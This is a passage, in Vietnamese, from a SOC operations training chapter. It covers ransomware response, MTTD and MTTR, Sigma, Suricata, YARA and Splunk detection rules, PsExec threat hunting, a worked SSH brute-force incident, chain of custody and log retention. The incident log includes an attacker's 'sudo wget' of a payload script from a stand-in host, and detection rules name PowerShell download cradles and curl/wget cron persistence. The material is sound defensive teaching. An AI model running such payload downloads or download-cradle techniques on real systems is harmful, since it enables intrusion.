   - KHÔNG tắt máy (giữ RAM cho forensic, một số biến thể giữ key trong RAM).
   - Cô lập backup khỏi mạng (ransomware nhắm backup).

2. IDENTIFY
   - Xác định biến thể (ransom note, extension, ID.Ransomware/no-more-ransom).
   - Patient zero & vector xâm nhập (RDP brute? phishing? lỗ hổng?).
   - Phạm vi: máy nào đã nhiễm, chia sẻ mạng nào bị mã hoá.

3. ERADICATE
   - Rebuild máy nhiễm từ image sạch (KHÔNG cố "làm sạch tại chỗ").
   - Đóng vector ban đầu, reset toàn bộ credential (giả định domain bị lộ).

4. RECOVER
   - Khôi phục từ backup ĐÃ XÁC MINH sạch (kiểm tra backup không bị nhiễm).
   - KHÔNG vội trả tiền chuộc (không đảm bảo, có thể vi phạm pháp luật/cấm vận).

5. LESSONS / ngoài kỹ thuật
   - Thông báo pháp lý/cơ quan chức năng tuỳ quy định; truyền thông; bảo hiểm.
```

**Lưu ý:** với ransomware, thứ tự ưu tiên đảo so với thông thường — **Containment đặt trước Identification** vì tốc độ lan của mã hoá tính bằng phút.

---

## 10.7. Chỉ số đo lường — MTTD, MTTR

### 10.7.1. Công thức

**MTTD (Mean Time To Detect):** thời gian trung bình từ khi sự cố BẮT ĐẦU đến khi được PHÁT HIỆN.

```
MTTD = Σ (T_detect[i] − T_start[i]) / N
```

**MTTR (Mean Time To Respond/Recover/Remediate — cần định nghĩa rõ):** thời gian trung bình từ khi phát hiện đến khi xử lý/khôi phục xong.

```
MTTR = Σ (T_resolve[i] − T_detect[i]) / N
```

Các biến thể hay gặp (nên ghi rõ đang đo cái nào):
- **MTTA** (Acknowledge): từ alert đến khi analyst nhận xử lý.
- **MTTR** có thể là Respond, Recover, hoặc Remediate — định nghĩa khác nhau, phải thống nhất nội bộ.

Ví dụ tính: 3 sự cố với (detect − start) = 4h, 12h, 2h → MTTD = (4+12+2)/3 = 6h.

### 10.7.2. Cách cải thiện

| Chỉ số | Cách cải thiện |
|---|---|
| MTTD | Tăng visibility (cover gap log), thêm detection rule chất lượng, threat hunting chủ động, giảm FP để analyst tập trung |
| MTTA | Định tuyến alert đúng, giảm alert fatigue (gom/dedupe), trực 24/7 |
| MTTR | Tự động hoá (SOAR playbook), runbook rõ ràng, quyền hành động sẵn (pre-approved containment), tập trận |

**Lưu ý bảo mật:** tối ưu MTTD/MTTR mù quáng dễ dẫn tới "đóng case cho nhanh" → bỏ sót. Chỉ số phải đi cùng tỷ lệ TP/FP và rà soát chất lượng closure.

---

## 10.8. Công cụ thực hành — ví dụ chạy được

### 10.8.1. Sigma — viết detection rule độc lập SIEM

**LÀ GÌ:** Sigma là định dạng YAML mô tả detection rule một cách generic, sau đó dùng `sigma`/`sigmac` (pySigma) chuyển sang query của SIEM cụ thể (Splunk SPL, Elastic KQL/EQL, QRadar AQL...).

**Ví dụ rule thực tế — phát hiện brute-force SSH/Windows:**

```yaml
title: Multiple Failed Logons Followed by Success (Possible Brute-Force)
id: 7a8b9c10-1111-2222-3333-444455556666
status: experimental
description: Detects >=20 failed logons from a single source then a success
logsource:
  product: windows
  service: security
detection:
  failed:
    EventID: 4625
  success:
    EventID: 4624
  timeframe: 5m
  condition: failed | count() by IpAddress > 20
fields:
  - IpAddress
  - TargetUserName
  - LogonType
falsepositives:
  - Misconfigured service account
  - Vulnerability scanner
level: high
tags:
  - attack.credential_access
  - attack.t1110            # Brute Force
```

Giải thích tham số: `logsource` xác định nguồn để pySigma chọn field mapping đúng; `detection` chứa các "search identifier" (`failed`, `success`); `condition` là biểu thức logic; `timeframe` là cửa sổ tương quan; `tags` ánh xạ MITRE ATT&CK (T1110 = Brute Force).

**Convert sang Splunk:**

```bash
sigma convert -t splunk -p splunk_windows brute_force.yml
```

Output mẫu (rút gọn):

```
EventCode=4625 | stats count by IpAddress | where count > 20
```

**Lưu ý bảo mật:** luôn khai báo `falsepositives` để Tier 1 biết bối cảnh; ánh xạ `tags` MITRE giúp đo coverage (ô nào trên ATT&CK matrix đã có rule).

### 10.8.2. Suricata — IDS/IPS, mổ xẻ một rule

**LÀ GÌ:** Suricata là engine IDS/IPS phân tích gói tin theo signature.

**Cấu trúc rule:**

```
action proto src_ip src_port direction dst_ip dst_port (options)
```

Ví dụ thực tế — phát hiện SSH brute-force bằng threshold:

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH brute force attempt"; \
  flow:to_server,established; \
  threshold:type threshold, track by_src, count 5, seconds 60; \
  classtype:attempted-admin; sid:1000001; rev:1;)
```

Mổ xẻ từng phần:

| Thành phần | Ý nghĩa | Ví dụ |
|---|---|---|
| action | Hành động khi khớp | `alert` (chỉ cảnh báo), `drop` (IPS) |
| proto | Giao thức | `tcp` |
| src_ip / src_port | Nguồn | `$EXTERNAL_NET any` |
| direction | Chiều | `->` (một chiều) |
| dst_ip / dst_port | Đích | `$HOME_NET 22` |
| msg | Mô tả trong alert | `"SSH brute force attempt"` |
| flow | Trạng thái kết nối | `to_server,established` |
| threshold | Ngưỡng tần suất | 5 lần / 60s / theo src |
| classtype | Phân loại | `attempted-admin` |
| sid | Signature ID (≥1000000 cho rule tự định nghĩa) | `1000001` |
| rev | Phiên bản rule | `1` |

**Chạy thử offline trên file pcap:**

```bash
suricata -r capture.pcap -S local.rules -l ./output/
cat ./output/fast.log
```

Output mẫu `fast.log`:

```
06/19/2026-08:21:09.003456 [**] [1:1000001:1] SSH brute force attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 203.0.113.45:51022 -> 10.0.0.5:22
```

**Lưu ý bảo mật:** `alert` chỉ phát hiện; để chặn cần chế độ IPS (`drop`) và Suricata phải inline (NFQUEUE/AF_PACKET). `threshold` quá nhạy gây FP, quá cao bỏ sót — phải tune theo baseline.

### 10.8.3. YARA — phân loại file/malware theo pattern

**LÀ GÌ:** YARA mô tả pattern (chuỗi, byte, regex) để nhận diện malware family.

```yara
rule Suspicious_PowerShell_Downloader
{
    meta:
        author = "soc-team"
        description = "Encoded PowerShell download cradle"
        date = "2026-06-19"
    strings:
        $a = "powershell" nocase
        $b = "-EncodedCommand" nocase
        $c = "DownloadString" nocase
        $hex = { 49 45 58 20 28 4E 65 77 }   // "IEX (New"
    condition:
        $a and ($b or $c or $hex)
}
```

Giải thích: `strings` định nghĩa pattern (`nocase` không phân biệt hoa thường; `$hex` là chuỗi byte chính xác — `49 45 58` = ASCII "IEX"); `condition` là logic kết hợp.

**Quét thực tế:**

```bash
yara -r downloader.yar /home/user/Downloads/
# Output: Suspicious_PowerShell_Downloader /home/user/Downloads/invoice.ps1
```

**Lưu ý bảo mật:** pattern quá chung (chỉ `$a` "powershell") gây FP hàng loạt; nên kết hợp nhiều điều kiện và byte-pattern đặc trưng.

### 10.8.4. Splunk SPL — truy vấn điều tra

**Ví dụ phát hiện brute-force-rồi-success (kịch bản mục 10.10):**

```spl
index=wineventlog (EventCode=4625 OR EventCode=4624)
| transaction IpAddress maxspan=10m
| where eventcount > 20 AND searchmatch("EventCode=4624")
| table _time IpAddress TargetUserName eventcount
```

Giải thích tham số: `transaction` gom các event cùng `IpAddress` trong `maxspan=10m`; `eventcount` là số event trong transaction; điều kiện lọc giao dịch vừa có nhiều fail vừa có ít nhất 1 success.

### 10.8.5. Velociraptor / osquery — truy vấn endpoint phục vụ hunt

**osquery** cho phép truy vấn trạng thái endpoint bằng SQL. Ví dụ tìm process lắng nghe cổng lạ:

```sql
SELECT p.name, p.pid, l.port, l.address
FROM listening_ports l
JOIN processes p ON l.pid = p.pid
WHERE l.port NOT IN (22, 80, 443, 3389);
```

Tìm scheduled task/cron persistence (Linux):

```sql
SELECT * FROM crontab WHERE command LIKE '%curl%' OR command LIKE '%wget%';
```

### 10.8.6. The Hive / SOAR — quản lý case & tự động hoá

**LÀ GÌ:** TheHive là nền tảng quản lý case IR; Cortex chạy "analyzers" (vd VirusTotal lookup hash). SOAR (Security Orchestration, Automation and Response) chạy playbook tự động.

Ví dụ logic playbook SOAR (giả mã) cho phishing:

```
on alert "phishing":
  observables = extract(email)         # sender, url, hash
  for each url in observables.urls:
     vt = VirusTotal.lookup(url)
     if vt.malicious >= 3:
         MailGateway.block(url)
         create_case(severity="high")
         M365.purge(subject=email.subject)
  notify_slack("#soc", summary)
```

**Lưu ý bảo mật:** tự động hoá hành động có sức phá hoại (block/purge/isolate) phải có rào chắn: chỉ auto-thực thi với confidence cao; hành động rủi ro cao cần human-in-the-loop để tránh kẻ tấn công lợi dụng SOAR gây DoS (vd cố tình trigger để auto-block dải IP hợp pháp).

---

## 10.9. Threat Hunting — giả thuyết dựa trên MITRE ATT&CK

### 10.9.1. Nguyên lý

Hunting là **chủ động** đi tìm dấu vết kẻ tấn công mà detection tự động CHƯA bắt được. Khác với triage (phản ứng với alert), hunting bắt đầu từ một **giả thuyết** (hypothesis) thường dựa trên một kỹ thuật trong **MITRE ATT&CK** (ma trận Tactics × Techniques, mỗi technique có mã Txxxx).

Vòng lặp hunt:

```
1. Hypothesis  -> "Kẻ tấn công có thể đang lateral movement bằng PsExec (T1021.002 / T1570)"
2. Data        -> Xác định nguồn dữ liệu cần: Event 7045 (service install), 4624 LogonType 3,
                  network SMB 445, process create (4688) named psexesvc.
3. Hunt/Query  -> Chạy query tìm dấu hiệu.
4. Triage      -> Phát hiện gì? phân tích.
5. Outcome     -> Nếu tìm thấy -> incident. Nếu không -> tạo detection mới để tự động hoá hunt.
```

### 10.9.2. Ví dụ hunt cụ thể — Lateral Movement qua PsExec

**Giả thuyết:** "Một host nội bộ đang dùng PsExec để chạy lệnh từ xa trên host khác."

**Dấu hiệu byte/event đặc trưng của PsExec:**
- PsExec tạo một **service tên `PSEXESVC`** trên máy đích → **Event 7045** với `Service Name = PSEXESVC` và đường dẫn binary `%SystemRoot%\PSEXESVC.exe`.
- Logon kiểu **Network (LogonType 3)** từ host nguồn (Event 4624) ngay trước đó.
- Kết nối **SMB cổng 445** từ nguồn tới đích; ghi file qua **ADMIN$ share**.
- Named pipe `\PSEXESVC` được tạo.

**Query Splunk:**

```spl
index=wineventlog EventCode=7045 Service_Name="PSEXESVC"
| stats count by Computer, _time
| sort _time
```

Tương quan với logon network:

```spl
index=wineventlog EventCode=4624 Logon_Type=3
| join Computer
  [ search index=wineventlog EventCode=7045 Service_Name="PSEXESVC" ]
| table _time, Computer, IpAddress, TargetUserName
```

**Tinh ý:** kẻ tấn công có thể đổi tên service (PsExec hỗ trợ `-r`); hunt nâng cao tìm **mẫu hành vi** (service mới tạo + binary trong đường dẫn lạ + chạy ngay 1 lần rồi gỡ) chứ không chỉ tên `PSEXESVC`.

**Ánh xạ MITRE:** T1021.002 (SMB/Windows Admin Shares), T1570 (Lateral Tool Transfer), T1569.002 (Service Execution).

### 10.9.3. Mô hình "Pyramid of Pain"

Khi tạo IOC/detection, ưu tiên các chỉ dấu khó né tránh:

```
            ▲ Khó cho attacker đổi (giá trị cao)
   TTPs               <- Khó nhất, nên săn
   Tools
   Network/Host Artifacts
   Domain Names
   IP Addresses
   Hash Values        <- Dễ đổi nhất (giá trị thấp)
            ▼
```

**VÌ SAO:** hash thay đổi chỉ bằng cách thêm 1 byte; nhưng hành vi (TTP) phản ánh cách kẻ tấn công VẬN HÀNH, đổi rất tốn kém. Hunt theo TTP/hành vi bền hơn hunt theo IOC tĩnh.

---

## 10.10. Tình huống mẫu — phân tích từ đầu đến cuối

Kịch bản: **nhiều login fail rồi một login success** trên một máy chủ Linux có SSH mở Internet (`auth-srv-01`, IP nội bộ `10.0.0.5`).

### Bước 0 — Raw log thô (`/var/log/auth.log`)

```
Jun 19 08:20:31 auth-srv-01 sshd[4801]: Failed password for invalid user admin from 203.0.113.45 port 50991 ssh2
Jun 19 08:20:33 auth-srv-01 sshd[4805]: Failed password for invalid user root from 203.0.113.45 port 50995 ssh2
Jun 19 08:20:35 auth-srv-01 sshd[4809]: Failed password for invalid user oracle from 203.0.113.45 port 51001 ssh2
... (hàng trăm dòng tương tự, ~3 lần/giây) ...
Jun 19 08:24:58 auth-srv-01 sshd[5102]: Failed password for deploy from 203.0.113.45 port 52210 ssh2
Jun 19 08:25:01 auth-srv-01 sshd[5108]: Accepted password for deploy from 203.0.113.45 port 52240 ssh2
Jun 19 08:25:01 auth-srv-01 sshd[5108]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Jun 19 08:25:44 auth-srv-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
```

### Bước 1 — Detection
Sigma/Suricata threshold (mục 10.8) phát ra alert "SSH brute force from 203.0.113.45". Tier 1 nhận alert.

### Bước 2 — Triage (Tier 1)
- **Xác minh:** đọc raw log, xác nhận ~400 fail trong ~4.5 phút từ 1 src → TP, không phải FP/scanner đã biết.
- **Điểm chuyển nghiêm trọng:** dòng `Accepted password for deploy` → **đã có success**. Nâng severity từ "brute-force attempt" lên "credential compromise". Escalate Tier 2 NGAY.

Truy vấn đếm:

```bash
grep "Failed password" /var/log/auth.log | grep "203.0.113.45" | wc -l
# 412
grep "Accepted password" /var/log/auth.log | grep "203.0.113.45"
# Jun 19 08:25:01 ... Accepted password for deploy from 203.0.113.45 ...
```

### Bước 3 — Analysis (Tier 2)
- **Timeline:** 08:20:31 bắt đầu spray → 08:25:01 success user `deploy` → 08:25:44 chạy `sudo wget http://203.0.113.45/x.sh` (tải payload, nghi second-stage).
- **Scope:** user `deploy` đã chạy sudo → có thể đã thành root. Phải coi như **toàn host bị xâm nhập**.
- **IOC trích xuất:** IP `203.0.113.45`, user mục tiêu `deploy`, URL payload `http://203.0.113.45/x.sh`.

### Bước 4 — Containment (short-term)
```bash
# Cô lập host khỏi mạng nhưng GIỮ máy chạy (bảo toàn RAM)
sudo iptables -I INPUT 1 -s 203.0.113.45 -j DROP
sudo iptables -I OUTPUT 1 -d 203.0.113.45 -j DROP
# Hoặc cô lập toàn bộ qua EDR network-isolate. Thu thập trước khi cắt hẳn.
```
Thu thập volatile data trước eradication:
```bash
ss -tnp        # kết nối đang mở (tìm reverse shell tới 203.0.113.45)
ps auxf        # cây tiến trình
sudo lsof -p <pid_nghi>
crontab -l; ls -la /etc/cron.*   # persistence
last; w        # phiên đăng nhập
```

### Bước 5 — Forensic & Chain of Custody
- Chụp memory (vd `LiME`/`avml`) và disk image trước khi thay đổi.
- Tính hash bằng chứng và ghi chain of custody (mục 10.11).

### Bước 6 — Eradication
- Reset mật khẩu `deploy` + mọi tài khoản; vô hiệu hoá SSH password auth (chuyển key-only).
- Tìm & xoá payload `x.sh`, backdoor, cron lạ, key SSH lạ trong `~/.ssh/authorized_keys`.
- Vì đã có quyền root khả nghi → **rebuild host từ image sạch** thay vì làm sạch tại chỗ.

### Bước 7 — Recovery
- Khôi phục dịch vụ trên host mới build; đặt SSH sau bastion/VPN; bật fail2ban + MFA; giám sát tăng cường 203.0.113.45 và hành vi của `deploy`.

### Bước 8 — Lessons Learned
- Vì sao SSH password mở thẳng Internet? Vì sao `deploy` mật khẩu yếu, không MFA? → Áp chính sách key-only, MFA, rate-limit, đưa SSH ra khỏi Internet. Bổ sung detection "success ngay sau chuỗi fail" để rút ngắn MTTD.

---

## 10.11. Chain of Custody & Forensic cơ bản

### 10.11.1. Chain of Custody (chuỗi lưu giữ bằng chứng)

**LÀ GÌ:** hồ sơ ghi lại AI đã giữ bằng chứng, KHI NÀO, LÀM GÌ với nó — để bằng chứng có giá trị pháp lý (chứng minh không bị giả mạo).

Mẫu biểu chain of custody — từng trường bắt buộc:

| Trường | Ý nghĩa | Ví dụ |
|---|---|---|
| Evidence ID | Mã định danh duy nhất | EV-2026-0619-001 |
| Description | Mô tả vật chứng | Disk image auth-srv-01, 500GB |
| Collected by | Người thu thập | Analyst A |
| Date/Time | Thời điểm (kèm timezone) | 2026-06-19 09:10 UTC |
| Hash (acquisition) | Hash lúc thu thập | SHA-256: a1b2... |
| Method/Tool | Công cụ + version | dd / FTK Imager 4.7 |
| Custody log | Chuỗi bàn giao (từ → đến, thời gian, lý do) | A → B, 10:00, để phân tích |

### 10.11.2. Nguyên tắc Order of Volatility (RFC 3227)

Thu thập theo thứ tự dễ mất trước → bền sau:

```
1. CPU registers, cache
2. RAM (process, network state, mã không lưu đĩa)
3. Network state (kết nối, ARP, bảng routing)
4. Running processes
5. Disk (file system)
6. Remote logging / monitoring data
7. Cấu hình vật lý, topology
8. Phương tiện lưu trữ ngoài (backup, ...)
```

**VÌ SAO:** RAM mất khi tắt nguồn; tắt máy ngay = mất reverse shell, mã chạy chỉ trong bộ nhớ, key giải mã. Đây là lý do trong playbook ransomware/brute-force ta **không tắt máy**, chỉ cô lập mạng.

### 10.11.3. Thu thập & xác minh tính toàn vẹn

```bash
# Tạo disk image read-only và tính hash cùng lúc
sudo dd if=/dev/sda bs=4M conv=noerror,sync status=progress | tee image.dd | sha256sum
# Lưu hash
sha256sum image.dd > image.dd.sha256
# Khi xác minh lại sau:
sha256sum -c image.dd.sha256
# image.dd: OK
```

**VÌ SAO dùng hash:** SHA-256 (256-bit/32-byte digest) cho phép chứng minh image không đổi một bit nào kể từ lúc thu thập. Một bit đổi → hash đổi hoàn toàn (avalanche effect). Dùng **write-blocker** phần cứng để đảm bảo không ghi đè bằng chứng khi đọc.

**Lưu ý bảo mật/pháp lý:** vi phạm chain of custody (khoảng trống thời gian, không hash, dùng tool không tin cậy) làm bằng chứng mất giá trị tại toà. Forensic phải làm trên **bản sao** (image), không bao giờ trên ổ gốc.

---

## 10.12. Log Retention — chính sách lưu trữ và lý do

### 10.12.1. Vì sao phải lưu lâu

- **Dwell time:** thời gian kẻ tấn công ẩn trong mạng trước khi bị phát hiện thường tính bằng tuần đến tháng (theo các báo cáo ngành như Mandiant M-Trends — con số cụ thể thay đổi theo năm, [cần kiểm chứng theo báo cáo mới nhất]). Nếu chỉ giữ log 30 ngày mà dwell time 90 ngày → không có log thời điểm xâm nhập ban đầu để điều tra.
- **Tuân thủ:** nhiều khung yêu cầu thời hạn tối thiểu. Ví dụ phổ biến (cần đối chiếu phiên bản hiện hành):
  - PCI DSS: tối thiểu 1 năm log, trong đó ≥ 3 tháng truy cập ngay (immediately available) — [đối chiếu PCI DSS bản hiện hành].
  - Nhiều quy định tài chính/y tế yêu cầu nhiều năm.

### 10.12.2. Mô hình lưu trữ phân tầng (hot/warm/cold)

| Tầng | Thời gian | Đặc điểm | Mục đích |
|---|---|---|---|
| Hot | 0–30 ngày | Index đầy đủ, truy vấn nhanh, đắt | Detection & điều tra hiện hành |
| Warm | 30–90 ngày | Index một phần, chậm hơn | Điều tra sự cố gần |
| Cold/Archive | 90 ngày–nhiều năm | Nén, lưu rẻ (object storage), khôi phục chậm | Tuân thủ, điều tra cũ, pháp lý |

**VÌ SAO phân tầng:** index nóng tốn CPU/RAM/đĩa; giữ tất cả ở hot rất đắt. Phân tầng cân bằng chi phí với khả năng truy cập.

### 10.12.3. Bảo vệ tính toàn vẹn của log

- **Write-once / WORM** hoặc append-only để chống sửa/xoá log (kẻ tấn công luôn cố xoá log — Event 1102 là dấu hiệu).
- **Forward log realtime** khỏi host (về SIEM) để nếu host bị chiếm thì log vẫn còn ở nơi khác.
- **Time sync (NTP)** trên toàn hạ tầng — không có thời gian thống nhất thì không dựng được timeline tương quan đa nguồn.

**Lưu ý bảo mật:** retention không chỉ là "giữ bao lâu" mà còn là "ai đọc được" — log chứa dữ liệu nhạy cảm (username, IP, đôi khi cleak credential). Kiểm soát truy cập kho log và mã hoá at-rest là bắt buộc.

---

## 10.13. Tổng kết kết nối các mảnh

Vận hành SOC là một vòng khép kín: **chuẩn bị (logging, playbook, công cụ) → phát hiện (rule trên log chuẩn hoá) → triage (Tier 1) → điều tra (Tier 2) → ứng phó (containment/eradication/recovery, bảo toàn bằng chứng) → bài học → cải tiến detection**. Threat hunting (Tier 3) bơm các phát hiện mới ngược trở lại làm giàu detection tự động. Mọi bước đều dựa trên một nền tảng chung: **đọc đúng log tới từng trường** (syslog PRI, Event ID/LogonType/Status, CEF extension), **đo lường đúng** (MTTD/MTTR có định nghĩa rõ), và **xử lý bằng chứng đúng chuẩn** (order of volatility, chain of custody, hash toàn vẹn). Nắm chắc các chi tiết byte/field/bước này là điều kiện để không bị kẻ tấn công lợi dụng chính những điểm mù trong vận hành.
